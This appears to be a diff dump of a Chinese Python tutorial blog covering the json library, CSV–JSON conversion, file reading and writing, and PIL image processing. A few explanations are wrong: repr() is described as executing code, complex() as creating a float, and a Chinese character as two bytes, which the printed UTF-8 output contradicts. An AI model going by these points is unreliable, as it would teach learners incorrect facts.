-<p>（3）json格式包括<strong>对象和数组</strong>，用大括号{}和方括号[]表示，分别对应键值对的组合关系和对等关系。一般来说，JSON格式的<strong>对象将被json库解析为字典，JSON格式的数组将被解析为列表。</strong></p>
-<h3 id="json库解析"><a href="#json库解析" class="headerlink" title="json库解析"></a>json库解析</h3><p>（1）json库包含两个过程：编码（encoding）和解码（decoding）。</p>
-<ul>
-<li>编码是将Python数据类型变换成JSON格式的过程</li>
-<li>解码是从JSON格式中解析数据对应到Python数据类型的过程</li>
-<li>本质上，编码和解码是<strong>数据类型序列化和反序列化的过程</strong></li>
-</ul>
-<p>扩展：<strong>序列化和反序列化</strong></p>
-<ul>
-<li>序列化是指将对象数据类型转换为可以存储或网络传输格式的过程，传输格式一般为JSON或XML</li>
-<li>反序列化指从存储区域中将JSON或XML格式读出并重建对象的过程。</li>
-<li>JSON序列化和反序列化的过程分别是编码和解码</li>
-</ul>
-<p>（2）下表列出了json库的4个操作类函数，其中dumps()和loads()分别对应编码和解码功能</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">json.dumps(obj,sort_keys=False,indent=None)</td>
-<td align="center">将Python的数据类型转换为JSON格式，编码过程</td>
-</tr>
-<tr>
-<td align="center">json.loads(string)</td>
-<td align="center">将JSON格式字符串转换为Python的数据类型，解码过程</td>
-</tr>
-<tr>
-<td align="center">json.dump(obj,fp,sort_keys=False,indent=None)</td>
-<td align="center">与dumps()功能一致，输出到文件fp</td>
-</tr>
-<tr>
-<td align="center">json.load(fp)</td>
-<td align="center">与loads()功能一致，从文件fp读入</td>
-</tr>
-</tbody></table>
-<p>（3）json.dumps()中的</p>
-<ul>
-<li><strong>obj可以是Python的列表或字典类型</strong>，当输入字典类型时，dumps()函数将其变为JSON格式字符串。</li>
-<li><strong>默认生成的字符串是顺序存放的</strong>，sort_keys可以对字典元素按照key进行排序，控制输出结果。</li>
-<li><strong>indent参数用于增加数据缩进</strong>，使得生成的JSON格式字符串更具有可读性。</li>
-</ul>
-<pre><code class="python">&gt;&gt;&gt; import json
-&gt;&gt;&gt; dt = &#123;&#39;b&#39;:2,&#39;c&#39;:4,&#39;a&#39;:6&#125;
-&gt;&gt;&gt; s1 = json.dumps(dt)          #dumps返回JSON格式的字符串类型
-&gt;&gt;&gt; s2 = json.dumps(dt,sort_keys=True,indent=4)
-&gt;&gt;&gt; print(s1)
-&#123;&quot;b&quot;: 2, &quot;c&quot;: 4, &quot;a&quot;: 6&#125;
-&gt;&gt;&gt; print(s2)
-&#123;
-    &quot;a&quot;: 6,
-    &quot;b&quot;: 2,
-    &quot;c&quot;: 4
-&#125;
-&gt;&gt;&gt; print(s1==s2)
-False
-&gt;&gt;&gt; dt2 = json.loads(s2)
-&gt;&gt;&gt; print(dt2,type(dt2))
-&#123;&#39;a&#39;: 6, &#39;b&#39;: 2, &#39;c&#39;: 4&#125; &lt;class &#39;dict&#39;&gt;</code></pre>
-<h2 id="CSV和JSON格式相互转换"><a href="#CSV和JSON格式相互转换" class="headerlink" title="CSV和JSON格式相互转换"></a>CSV和JSON格式相互转换</h2><p>（1）CSV格式常用于一二维数据表示和存储，它是一种纯文本形式存储表格数据的表示方法。JSON也可以表示一二维数据。在网络信息传输中，可能需要统一表示，因此，需要在二者之间相互转换。</p>
-<h3 id="CSV转JSON"><a href="#CSV转JSON" class="headerlink" title="CSV转JSON"></a>CSV转JSON</h3><p>（2）以price2021.csv作为输入，希望输出的JSON格式对应于每行数据如下：</p>
-<pre><code>&quot;同比&quot;: &quot;120.7&quot;,
-&quot;城市&quot;: &quot;北京&quot;,
-&quot;定基&quot;: &quot;121.4&quot;,
-&quot;环比&quot;: &quot;101.5&quot;</code></pre>
-<p>将CSV格式转换成JSON格式的代码如下：</p>
-<pre><code class="python">import json
-fr = open(&quot;price2021.csv&quot;, &quot;r&quot;)
-ls = []
-for line in fr:
-    line = line.replace(&quot;\n&quot;,&quot;&quot;)
-    ls.append(line.split(&#39;,&#39;))
-fr.close()
-fw = open(&quot;price2021.json&quot;, &quot;w&quot;)
-for i in range(1,len(ls)):
-    ls[i] = dict(zip(ls[0], ls[i]))  
-    #dict()用于创建一个字典，zip()是一个内置函数，能够将两个长度相同的列表组合成一个关系对
-json.dump(ls[1:],fw, sort_keys=True, indent=4)
-fw.close()
-
-#执行结果部分内容
-[
-    &#123;
-        &quot;\u540c\u6bd4&quot;: &quot;120.7&quot;,
-        &quot;\u57ce\u5e02&quot;: &quot;\u5317\u4eac&quot;,
-        &quot;\u5b9a\u57fa&quot;: &quot;121.4&quot;,
-        &quot;\u73af\u6bd4&quot;: &quot;101.5&quot;
-    &#125;,
-    ...</code></pre>
-<p>（3）zip()函数适合用于生成键值对。</p>
-<pre><code class="python">&gt;&gt;&gt; x = [1,2,3]
-&gt;&gt;&gt; y = [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]
-&gt;&gt;&gt; list(zip(x,y)) 
-[(1, &#39;a&#39;), (2, &#39;b&#39;), (3, &#39;c&#39;)]</code></pre>
-<p>（4）上例转换代码没有输出中文字符，原内容的中文字符被替换成了Unicode编码。<strong>json库默认采用Unicode编码处理非西文字符，主要为了避免网络传输中因编码方式不同带来的问题。</strong></p>
-<p>（5）可以通过在dump()函数中修改ensure_ascii参数默认值使json库输出中文字符。修改实例中第12行代码：</p>
-<pre><code class="python">json.dump(ls[1:],fw, sort_keys=True, indent=4, ensure_ascii=False)</code></pre>
-<ul>
-<li>修改后的代码执行结果：</li>
-</ul>
-<pre><code>[
-    &#123;
-        &quot;同比&quot;: &quot;120.7&quot;,
-        &quot;城市&quot;: &quot;北京&quot;,
-        &quot;定基&quot;: &quot;121.4&quot;,
-        &quot;环比&quot;: &quot;101.5&quot;
-    &#125;,
-    &#123;
-        &quot;同比&quot;: &quot;127.3&quot;,
-        &quot;城市&quot;: &quot;上海&quot;,
-        &quot;定基&quot;: &quot;127.8&quot;,
-        &quot;环比&quot;: &quot;101.2&quot;
-    &#125;,
-    &#123;
-        &quot;同比&quot;: &quot;119.4&quot;,
-        &quot;城市&quot;: &quot;广州&quot;,
-        &quot;定基&quot;: &quot;120&quot;,
-        &quot;环比&quot;: &quot;101.3&quot;
-    &#125;,
-    &#123;
-        &quot;同比&quot;: &quot;140.9&quot;,
-        &quot;城市&quot;: &quot;深圳&quot;,
-        &quot;定基&quot;: &quot;145.5&quot;,
-        &quot;环比&quot;: &quot;102&quot;
-    &#125;,
-    &#123;
-        &quot;同比&quot;: &quot;101.4&quot;,
-        &quot;城市&quot;: &quot;沈阳&quot;,
-        &quot;定基&quot;: &quot;101.6&quot;,
-        &quot;环比&quot;: &quot;100.1&quot;
-    &#125;
-]</code></pre>
-<h3 id="JSON转CSV"><a href="#JSON转CSV" class="headerlink" title="JSON转CSV"></a>JSON转CSV</h3><pre><code class="python">import json
-fr = open(&quot;price2021.json&quot;,&quot;r&quot;)
-ls = json.load(fr)
-data = [ list(ls[0].keys())]    #keys()方法返回所有的键
-for item in ls:
-    data.append(list(item.values()))   #使用 list() 来转换为列表，列表为字典中的所有值。
-fr.close()
-fw = open(&quot;price2021_form_json.csv&quot;, &quot;w&quot;)
-for item in data:
-    fw.write(&quot;,&quot;.join(item) + &quot;\n&quot;)#join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。
-fw.close()</code></pre>
-<p>扩展：Python的数据类型转换函数</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">int(x,[,base])</td>
-<td align="center">将字符串x转换为一个整数</td>
-</tr>
-<tr>
-<td align="center">float(x)</td>
-<td align="center">将字符串x转换为一个浮点数</td>
-</tr>
-<tr>
-<td align="center">complex(real,[,image])</td>
-<td align="center">根据real和image创建一个浮点数</td>
-</tr>
-<tr>
-<td align="center">str(x)</td>
-<td align="center">将对象x转换为字符串</td>
-</tr>
-<tr>
-<td align="center">repr(obj)</td>
-<td align="center">将对象obj当作Python语句执行，返回结果的字符串形式</td>
-</tr>
-<tr>
-<td align="center">eval(str)</td>
-<td align="center">计算字符串中的有效Python表达式，返回结果</td>
-</tr>
-<tr>
-<td align="center">tuple(s)</td>
-<td align="center">将序列s转换为一个元组</td>
-</tr>
-<tr>
-<td align="center">list(s)</td>
-<td align="center">将序列s转换为一个列表</td>
-</tr>
-<tr>
-<td align="center">chr(x)</td>
-<td align="center">将一个整数转换为一个字符</td>
-</tr>
-<tr>
-<td align="center">unichr(x)</td>
-<td align="center">将一个整数转换为Unicode字符</td>
-</tr>
-<tr>
-<td align="center">ord(x)</td>
-<td align="center">将一个字符转换为它的整数值</td>
-</tr>
-<tr>
-<td align="center">hex(x)</td>
-<td align="center">将一个整数转换为一个十六进制字符串</td>
-</tr>
-<tr>
-<td align="center">oct(x)</td>
-<td align="center">将一个整数转换为一个八进制字符串</td>
-</tr>
-</tbody></table>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/05/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%8D%81)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9602/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/深入Python语言(九)-文件和数据格式化01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/">深入Python语言九-文件和数据格式化01</a>
-    </h1>
-  
-
-        
-        <a href="/2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/" class="archive-article-date">
-  	<time datetime="2021-03-27T13:27:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><h3 id="文件概述"><a href="#文件概述" class="headerlink" title="文件概述"></a>文件概述</h3><p><strong>Python能够以文本和二进制两种方式处理文件</strong></p>
-<p>（1）文件是一个存储在辅助存储器上的数据序列，可以包含任何数据内容。文件包括两种类型：<strong>文本文件和二进制文件。</strong></p>
-<p>（2）文本文件一般由单一特定编码的字符组成，如UTF-8编码，内容容易统一展示和阅读。由于文本文件存在编码，因此，它也可以被看作是存储在磁盘上的长字符串，例如一个txt格式的文本文件。</p>
-<p>（3）二进制文件直接由比特0和比特1组成，没有统一字符编码，文件内部数据的组织格式与文件用途有关。<strong>二进制文件与文本文件最主要的区别在于是否有统一的字符编码。</strong>二进制文件没有统一的字符编码，只能当作字节流，而不能看做是字符串。</p>
-<p>（4）无论文件是创建为文本文件还是二进制文件，都可以用“文本文件方式”和“二进制文件方式”打开，但打开后的操作不同。</p>
-<pre><code class="python">textFile = open(&quot;1.txt&quot;,&quot;rt&quot;)   #t表示文本文件方式
-print(textFile.readline())    #readline()是读出一行内容，read()是读出整个文件的内容
-textFile.close()              #关闭该文件
-binFile = open(&quot;1.txt&quot;,&quot;rb&quot;)   #b表示二进制文件方式
-print(binFile.readline())
-binFile.close()
-
-#运行结果
-中国是个伟大的国家！
-
-b&#39;\xe4\xb8\xad\xe5\x9b\xbd\xe6\x98\xaf\xe4\xb8\xaa\xe4\xbc\x9f\xe5\xa4\xa7\xe7\x9a\x84\xe5\x9b\xbd\xe5\xae\xb6\xef\xbc\x81\n&#39;</code></pre>
-<p>（5）采用文本方式读入文件，<strong>文件经过编码形成字符串，打印出有含义的字符；采用二进制方式打开文件，文件被解析为字节(Byte)流。</strong>由于存在编码，<strong>字符串中的一个字符由两个字节表示。</strong></p>
-<h3 id="文件的打开关闭"><a href="#文件的打开关闭" class="headerlink" title="文件的打开关闭"></a>文件的打开关闭</h3><p>（1）Python对文本文件和二进制文件采用统一的操作步骤，即“打开——操作——关闭”。</p>
-<p>（2）操作系统中的文件默认处于存储状态，首先需要将其打开，使得当前程序有权操作这个文件，打开不存在的文件可以创建文件。<strong>打开后的文件处于占用状态，此时，另一个进程不能操作这个文件。</strong></p>
-<p>（3）可以通过一组方法读取文件的内容或向文件写入内容，此时，文件作为一个数据对象存在，采用<a>.<b>()方式进行操作。</p>
-<p>（4）操作之后需要将文件关闭，关闭将释放对文件的控制使文件恢复存储状态，此时，另一个进程将能够操作这个文件。</p>
-<p><img src="https://i.loli.net/2021/03/30/3RkTJ7EbMZf8BuP.png" alt="image-20210330112125720"></p>
-<p>（5）Python通过解释器内置的open()函数打开一个文件，并实现该文件与一个程序变量的关联，open()函数格式如下：</p>
-<pre><code>&lt;变量名&gt; = open(&lt;文件名&gt;, &lt;打开模式&gt;)</code></pre>
-<p>（6）open()函数有两个参数：文件名和打开模式。文件名可以使文件的实际名字，<strong>也可以是包含完整路径的名字</strong>。<strong>打开模式用于控制使用何种方式打开文件</strong>,open()函数提供了7种基本的打开模式。</p>
-<table>
-<thead>
-<tr>
-<th>文件的打开模式</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>‘r’</td>
-<td>只读模式，若文件不存在，返回异常FileNotFoundError，默认值</td>
-</tr>
-<tr>
-<td>‘w’</td>
-<td>覆盖写模式，文件不存在则创建，存在则完全覆盖</td>
-</tr>
-<tr>
-<td>‘x’</td>
-<td>创建写模式，文件不存在则创建，存在则返回异常FileExistsError</td>
-</tr>
-<tr>
-<td>‘a’</td>
-<td>追加写模式，文件不存在则创建，存在则在文件最后追加内容</td>
-</tr>
-<tr>
-<td>‘b’</td>
-<td>二进制文件模式</td>
-</tr>
-<tr>
-<td>‘t’</td>
-<td>文本文件模式，默认值</td>
-</tr>
-<tr>
-<td>‘+’</td>
-<td>与/r/w/x/a一同使用，在原功能基础上增加同时读写功能</td>
-</tr>
-</tbody></table>
-<p>（7）打开模式使用字符串方式表示，根据字符串定义，单引号或者双引号均可。上述打开模式中，’r’、’w’、’x’、’a’可以和’b’、’t’、’+’组合使用，形成既表达读写又表达文件模式的方式。例如，open()函数默认采用’rt’（文本只读）模式，读入程序所在目录中1.txt文件：</p>
-<pre><code>textFile = open(&#39;1.txt&#39;, &#39;r&#39;)
-或者
-textFiel = open(&#39;1.txt&#39;)</code></pre>
-<p>（8）读取一个二进制文件，如一张图片、一段视频或者一段音乐，需要使用文件打开模式’rb’。例如，打开一个名为”music.mp3“的音频文件：</p>
-<pre><code>binFile = open(&#39;music.mp3&#39;, &#39;rb&#39;)</code></pre>
-<p>（9）文件结束后要用close()方法关闭，释放文件的使用授权，该方法的使用方式如下：</p>
-<pre><code>&lt;变量名&gt;.close()</code></pre>
-<h3 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h3><p>（1）当文件被打开后，根据打开的方式不同可以对文件进行相应的读写操作。</p>
-<ul>
-<li>当文件以文本文件方式打开后，读写按照字符串方式，采用当前计算机使用的编码或指定编码。</li>
-<li>当文件以二进制文件方式打开时，读写按照字节流方式。</li>
-</ul>
-<p>（2）Python提供3个常用的文件内容读取方法，如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>操作方法</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&lt;file&gt;.read(size = -1)</td>
-<td>从文件中读入整个文件内容，若给出参数，读入前size长度的字符串或字节流</td>
-</tr>
-<tr>
-<td>&lt;file&gt;.readline(size = -1)</td>
-<td>从文件中读入一行内容，如果给出参数，读入该行前size长度的字符串或字节流</td>
-</tr>
-<tr>
-<td>&lt;file&gt;.readlines(hint = -1)</td>
-<td>从文件中读入所有行，以每行为元素形成一个列表，若给出参数，读入hint行</td>
-</tr>
-</tbody></table>
-<p>（3）文本文件逐行打印：用户输入文件路径，以文本文件方式读入文件内容并逐行打印。</p>
-<pre><code class="python">fname = input(&quot;请输入要打开的文件：&quot;)
-fo = open(fname, &quot;r&quot;)
-for line in fo.readlines():
-    print(line)
-fo.close()
-&#39;&#39;&#39;
-程序首先提示用户输入一个文件名，然后打开文件并复制给文件对象变量fo。文件的全部内容通过fo.readlines()方法读入到一个列表中，列表中的每个元素是文件一行的内容，然后通过for-in方式遍历列表，处理每行内容。
-&#39;&#39;&#39;</code></pre>
-<p>（4）上述实例存在一个缺点：当读入文件非常大时，一次性将内容读取到列表中会占用很多内存，影响程序执行速度。</p>
-<p>解决方法：<strong>逐行读入内容到内存，并逐行处理。</strong>Python将文件本身作为一个行序列，遍历文件的所有行可以直接这样完成：</p>
-<pre><code class="python">fname = input(&quot;请输入要打开的文件：&quot;)
-fo = open(fname, &quot;r&quot;)
-for line in fo:
-    print(line)
-fo.close()
-
-&#39;&#39;&#39;
-若程序需要逐行处理文件内容，建议采用上述代码中的2到5行组成的格式。
-fo = open(fname, &quot;r&quot;)
-for line in fo:
-    #处理一行数据
-fo.close()
-&#39;&#39;&#39;</code></pre>
-<p>扩展：<strong>文件的换行符</strong>：若采用二进制方式打开文件，换行符只是一个符号，对应一个字节，表示为“\n”。若采用文本方式打开文件，换行符表示一行的结束。</p>
-<p>（5）Python提供3个与文件内容写入有关的方法，如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&lt;file&gt;.write(s)</td>
-<td>向文件中写入一个字符串或字节流</td>
-</tr>
-<tr>
-<td>&lt;fiel&gt;.writelines(lines)</td>
-<td>将一个元素全为字符串的列表写入文件</td>
-</tr>
-<tr>
-<td>&lt;file&gt;.seek(offset)</td>
-<td>改变当前文件操作指针的位置，offset的值：0——文件开头；1——当前位置；2——文件结尾</td>
-</tr>
-</tbody></table>
-<p>（6）向文件写入一个列表，并打印输出结果，代码如下：</p>
-<pre><code class="python">fname = input(&quot;请输入要写入的文件：&quot;)
-fo = open(fname,&#39;w+&#39;)
-ls = [&quot;唐诗&quot;,&quot;宋词&quot;,&quot;元曲&quot;]
-fo.writelines(ls)
-for line in fo:
-    print(line)
-fo.close()
-#执行结果：
-&gt;&gt;&gt;请输入要写入的文件：test.txt
-&gt;&gt;&gt;
-#linxu下查看文件
-cat test.txt
-唐诗宋词元曲</code></pre>
-<p>（7）上例中ls内容被写入了文件，但第5行至第7行的代码没有将内容打印出来。<strong>这是因为文件写入内容后，当前文件操作指针在写入内容的后面，第5行至第7行的代码从指针开始向后读入并打印内容，被写入的内容却在指针前面，因此未能被打印出来。</strong>为此，可以在写入文件后增加一条代码fo.seek(0)将文件操作指针返回到文件开始，即可显示写入的内容。</p>
-<pre><code class="python">fname = input(&quot;请输入要写入的文件：&quot;)
-fo = open(fname,&quot;w+&quot;)
-ls = [&quot;唐诗&quot;,&quot;宋词&quot;,&quot;元曲&quot;]
-fo.writelines(ls)              #writelinses()方法并不在列表后面增加换行，只是将列表内容直接排列输出。
-fo.seek(0)
-for line in fo:
-    print(line)
-fo.close()
-
-#程序执行结果：
-&gt;&gt;&gt;请输入要写入的文件：test1.txt
-唐诗宋词元曲</code></pre>
-<h2 id="PIL库的使用"><a href="#PIL库的使用" class="headerlink" title="PIL库的使用"></a>PIL库的使用</h2><h3 id="PIL库概述"><a href="#PIL库概述" class="headerlink" title="PIL库概述"></a>PIL库概述</h3><p>（1）PIL（Python Image Library）库是Python语言的第三方库，需要通过pip工具安装。注：安装库的名字是pillow。</p>
-<pre><code class="python">pip3 install pillow</code></pre>
-<p>（2）PIL库支持图像存储、显示和处理，它能够处理几乎所有图片格式，可以完成对图像的缩放、剪裁、叠加以及向图像添加线条、图像和文字等操作。</p>
-<p>（3）PIL库主要可以实现<strong>图像归档和图像处理</strong>两方面功能需求</p>
-<ul>
-<li>图像归档：对图像进行批处理、生成图像预览、图像格式转换等。</li>
-<li>图像处理：图像基本处理、像素处理、颜色处理等。</li>
-</ul>
-<p>（4）PIL库最常用的3个子库：Image、ImageFilter、ImageEnhance。PIL库共包括21个与图片相关的类，参考网站<a target="_blank" rel="noopener" href="http://effbot.org/imagingbook/">http://effbot.org/imagingbook/</a></p>
-<h3 id="PIL库Image类解析"><a href="#PIL库Image类解析" class="headerlink" title="PIL库Image类解析"></a>PIL库Image类解析</h3><p>（1）Image是PIL最重要的类，它代表一张图片。</p>
-<pre><code class="python">from PIL import Image       #引入Image类</code></pre>
-<p>（2）在PIL中，任何一个图像文件都可以用Image对象来表示。下表给出了Image类的图像读取和创建方法。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.open(filename)</td>
-<td>根据参数加载图像文件</td>
-</tr>
-<tr>
-<td>Image.new(mode,size,color)</td>
-<td>根据给定参数创建一个新的图像</td>
-</tr>
-<tr>
-<td>Image.open(StringIO.StringIO(buffer))</td>
-<td>从字符串中获取图像</td>
-</tr>
-<tr>
-<td>Image.frombytes(mode,size,data)</td>
-<td>根据像素点data创建图像</td>
-</tr>
-<tr>
-<td>Image.verify()</td>
-<td>对图像文件完整性进行检查，返回异常</td>
-</tr>
-</tbody></table>
-<p>（3）通过Image打开图像文件时，图像的栅格<strong>数据不会被直接解码或者加载</strong>，程序只是读取了图像文件头部的元数据信息，这部分信息标识了图像的<strong>格式、颜色、大小</strong>等。所以打开一个文件会很快，与图像的存储和压缩方式无关。</p>
-<p>（4）要加载一个图像文件，最简单的形式如下，之后所有的操作对im起作用。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&quot;/media/fafusr/28AC2EBFAC2E8780/图片/我的图片/3.jpg&quot;) #绝对路径
-&gt;&gt;&gt; im = Image.open(&quot;3.jpg&quot;)</code></pre>
-<p>（5）在使用IDLE交互方式处理图片文件时，建议采用文件的绝对路径；如果使用Python文件形式，建议采用相对路径，将文件和程序放到一个目录中。</p>
-<p>（6）Image类有4个处理图片的常用属性。</p>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.format</td>
-<td>标识图像格式或来源，若图像不是从文件读取，值为None</td>
-</tr>
-<tr>
-<td>Image.mode</td>
-<td>图像的色彩模式，”L”为灰度图像、”RGB”为真色彩图像、”CMYK”为出版图像</td>
-</tr>
-<tr>
-<td>Image.size</td>
-<td>图像宽度和高度，单位是像素(px)，返回值是二元元组(tuple)</td>
-</tr>
-<tr>
-<td>Image.palette</td>
-<td>调色板属性，返回一个ImagePalette类型</td>
-</tr>
-</tbody></table>
-<p>查看已经读取的图像文件的属性如下：</p>
-<pre><code class="python">&gt;&gt;&gt; print(im.format,im.size,im.mode)
-JPEG (1080, 1080) RGB</code></pre>
-<p>拓展：CMYK色彩是彩色印刷时采用的一套色彩体系，也称印刷四色。</p>
-<p>（7）Image还能读取序列类图像文件，包括GIF、FLI、FLC、TIFF等格式文件。open()方法打开一个图像是自动加载序列中的第一帧，使用seek()和tell()可以在不同帧之间移动。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.seek(frame)</td>
-<td>跳转并返回图像指定的帧</td>
-</tr>
-<tr>
-<td>Image.tell()</td>
-<td>返回当前帧的序号</td>
-</tr>
-</tbody></table>
-<p>（8）GIF文件图像提取：对一个GIF格式动态文件，提取其中的各帧图像，并保存为文件。</p>
-<pre><code class="python">from PIL import Image
-im = Image.open(&#39;pybit.gif&#39;)    # 读入一个GIF文件
-try:
-    im.save(&#39;picframe&#123;:02d&#125;.png&#39;.format(im.tell()))#&#123;:02d&#125;表示两个宽度的十进制显示，不够两位用0填充。
-    while True:
-        im.seek(im.tell()+1)
-        im.save(&#39;picframe&#123;:02d&#125;.png&#39;.format(im.tell()))
-except:
-    print(&quot;处理结束&quot;)</code></pre>
-<p>（9）Image类的图像转换和保存方法如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.save(filename, format)</td>
-<td>将文件保存为filename文件名，format是图片格式</td>
-</tr>
-<tr>
-<td>Image.convert(mode)</td>
-<td>使用不同的参数，转换图像为新的模式</td>
-</tr>
-<tr>
-<td>Image.thumbnail(size)</td>
-<td>创建图形的缩略图，size是缩略图尺寸的二元元组</td>
-</tr>
-</tbody></table>
-<p>（10）若调用save()时不指定保存格式，PIL将自动根据filename的后缀名存储图像，例如上例提取GIF图像的.png；若指定了格式，则按照格式存储。</p>
-<p>（11）搭配采用open()和save()方法可以实现图像的格式转换，例如，将jpg格式转换为png格式。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&quot;3.jpg&quot;)    
-&gt;&gt;&gt; im.save(&quot;3.png&quot;)    #save()方法主要用于将文件保存到硬盘，原有的3.jpg文件依然存在。PIL库还提供了更加强大的格式转换方式。</code></pre>
-<p>（12）生成3.jpg的缩略图，代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; im.thumbnail((128,128))   #(128,128)是缩略图的尺寸
-&gt;&gt;&gt; im.save(&quot;3TN&quot;,&quot;JPEG&quot;)</code></pre>
-<p>（13）Image类可以缩放和旋转图像，方法如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.resize(size)</td>
-<td>按size大小调整图像，生成副本</td>
-</tr>
-<tr>
-<td>Image.rotate(angle)</td>
-<td>以逆时针旋转的角度值angle作为参数来旋转图像，生成副本</td>
-</tr>
-</tbody></table>
-<p>（14）Image类能够对每个像素点或者一幅RGB图像的每个通道单独进行操作，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.point(func)</td>
-<td>根据函数func的功能对每个元素进行运算，返回图像副本</td>
-</tr>
-<tr>
-<td>Image.split()</td>
-<td>提取RGB图像的每个颜色通道，返回图像副本</td>
-</tr>
-<tr>
-<td>Image.merge(mode,bands)</td>
-<td>合并通道，其中mode表示色彩，bands表示新的色彩通道，再合成一幅新的图像</td>
-</tr>
-<tr>
-<td>Image.blend(im1,im2,alpha)</td>
-<td>将两幅图片im1和im2按照如下公式插值后生成新的图像:im1*(1.0-alpha)+im2*alpha</td>
-</tr>
-</tbody></table>
-<p>（15）图像的颜色交换，通过分离RGB图片的3个颜色通道实现颜色交换。代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&#39;01.jpg&#39;)
-&gt;&gt;&gt; r, g, b = im.split()
-&gt;&gt;&gt; om = Image.merge(&quot;RGB&quot;, (b, g, r))
-&gt;&gt;&gt; om.save(&#39;001.jpg&#39;)
-&gt;&gt;&gt; exit()</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/PaSwA1Mckibyz4g.png" alt="image-20210331122318860"></p>
-<p><img src="https://i.loli.net/2021/03/31/FV3oAvJiQLw4brY.png" alt="image-20210331122508093"></p>
-<p>（16）操作图像的每个像素点需要通过函数实现，可以采用lambda函数和point()方法。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&#39;/media/fafusr/28AC2EBFAC2E8780/Python/program/第七章/01.jpg&#39;)
-&gt;&gt;&gt; r,g,b = im.split()
-&gt;&gt;&gt; newg = g.point(lambda i:i*0.9)
-&gt;&gt;&gt; newb = b.point(lambda i:i&lt;100)
-&gt;&gt;&gt; om = Image.merge(im.mode,(r,newg,newb))
-&gt;&gt;&gt; om.save(&#39;/media/fafusr/28AC2EBFAC2E8780/Python/program/第七章/01merge.jpg&#39;)</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/MKAFULqrbl5BaE3.png" alt="image-20210331123014245"></p>
-<h3 id="图像的过滤和增强"><a href="#图像的过滤和增强" class="headerlink" title="图像的过滤和增强"></a>图像的过滤和增强</h3><p>（1）PIL库的ImageFilter类和ImageEnhance类提供了过滤图像和增强图像的方法。ImageFilter类提供了10种预定义图像过滤方法。如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>方法表示</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ImageFilter.BLUR</td>
-<td>图像的模糊效果</td>
-</tr>
-<tr>
-<td>ImageFilter.CONTOUR</td>
-<td>图像的轮廓效果</td>
-</tr>
-<tr>
